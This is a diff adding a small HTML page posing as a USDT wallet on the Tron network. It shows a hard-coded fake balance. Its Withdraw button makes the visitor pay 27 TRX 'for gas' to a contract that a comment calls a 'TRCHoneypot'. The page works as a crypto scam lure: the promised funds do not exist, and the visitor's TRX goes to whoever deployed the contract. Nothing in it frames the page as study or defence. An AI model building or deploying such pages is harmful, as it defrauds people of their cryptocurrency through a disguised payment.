@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>USDT Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <style>
+    body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding-top: 50px; }
+    .card { background: #222; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 20px #0f0; }
+    button { padding: 10px 20px; font-size: 18px; margin-top: 20px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Balance: <span id="balance">5897.65</span> USDT</h1>
+    <button onclick="attemptWithdraw()">Withdraw</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const CONTRACT_ADDRESS = "TUXXXXXXXXXXXXXX..."; // ← wklej swój adres TRCHoneypot z Shasty
+    const CONTRACT_ABI = [ // minimalny ABI
+      {
+        "inputs": [],
+        "name": "attemptWithdraw",
+        "outputs": [],
+        "stateMutability": "payable",
+        "type": "function"
+      }
+    ];
+
+    let tronWeb, contract;
+
+    async function setup() {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "Please connect TronLink to continue...";
+        return;
+      }
+      tronWeb = window.tronWeb;
+      contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+    }
+
+    async function attemptWithdraw() {
+      document.getElementById("status").innerText = "Processing withdrawal... You must have 27 TRX for gas";
+      try {
+        await contract.attemptWithdraw().send({ callValue: 27000000 }); // 27 TRX
+      } catch (e) {
+        document.getElementById("status").innerText = "Transaction failed or cancelled.";
+      }
+    }
+
+    window.addEventListener("load", setup);
+  </script>
+</body>
+</html>
